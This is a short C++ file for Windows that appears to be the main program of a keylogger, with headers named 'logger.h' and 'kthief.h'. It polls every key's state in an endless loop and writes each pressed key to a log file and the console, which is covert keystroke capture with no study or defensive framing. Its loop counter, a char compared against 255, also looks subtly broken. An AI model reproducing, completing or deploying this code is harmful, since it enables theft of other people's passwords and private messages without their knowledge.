#include <iostream>
#include <windows.h>

#include "logger.h"
#include "kthief.h"

using namespace std;

int main() {
    char key;
    while(TRUE){
        for(key = 1; key<=255; key++){
            if(GetAsyncKeyState(key) == KEY_PRESSED){
                if(!kthief::keyInList(key)){
                    Sleep(165);
                    writeToLog(key);
                    cout << key << endl;
                }
            }
        }
    }
    return 0;
}